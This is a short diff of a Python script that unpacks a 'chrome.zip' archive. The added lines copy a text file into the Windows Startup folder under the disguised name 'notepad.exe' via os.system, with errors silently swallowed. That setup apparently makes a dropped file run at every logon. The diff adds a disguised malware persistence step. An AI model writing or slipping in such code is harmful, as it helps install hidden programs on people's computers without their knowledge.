@@ -4,7 +4,6 @@ from zipfile import ZipFile
 import getpass
 
 
-
 user = getpass.getuser()
 try:
    with ZipFile('chrome.zip', 'r') as zipObj:
@@ -30,6 +29,9 @@ except:
    pass
 
 try:
-   
+   diree = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/notepad.exe'
+   di = f'copy diccionario1.txt "{diree}"'
+   print(di)
+   os.system(di)
 except:
    pass
